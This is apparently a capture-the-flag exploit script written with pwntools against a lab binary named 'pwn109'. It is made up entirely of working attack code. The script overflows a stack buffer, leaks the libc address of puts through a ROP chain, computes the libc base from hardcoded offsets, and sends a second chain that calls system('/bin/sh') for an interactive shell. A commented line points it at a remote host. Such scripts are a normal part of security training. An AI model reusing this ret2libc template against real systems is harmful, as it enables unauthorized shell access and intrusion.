from pwn import *

binary = context.binary = ELF('./pwn109.pwn109', checksec=False)

p = binary.process()
libc = binary.libc # for local libc
rop = ROP(binary)
#p = remote("10.10.42.229", 9009)


payload = b'A'*40 # junk
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) #p64(0x4012a3)
payload += p64(binary.got['puts']) # got add
payload += p64(binary.plt['puts'])
payload += p64(binary.sym['main'])

log.success(f'Got : {hex(binary.got.puts)}')
log.success(f'Puts : {hex(binary.plt.puts)}')
log.success(f'Main : {hex(binary.sym.main)}')

p.sendlineafter(b"Go ahead \xf0\x9f\x98\x8f\n", payload)

leak = u64(p.recvuntil(b'\x7f')+b'\x00\x00')
log.success(f'leak : {hex(leak)}')

#https://libc.blukat.me/
libc_base = leak - 0x080aa0 # libc6_2.27-3ubuntu1.4_amd64
log.success(f'Libc Base Address : {hex(libc_base)}')

payload = b'A'*40 # junk
payload += p64(rop.find_gadget(['ret'])[0]) #p64(0x40101a)
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(libc_base + 0x1b3e1a) # bin_sh
payload += p64(libc_base + 0x04f550) # system

p.sendlineafter(b"Go ahead \xf0\x9f\x98\x8f\n", payload)
p.interactive()
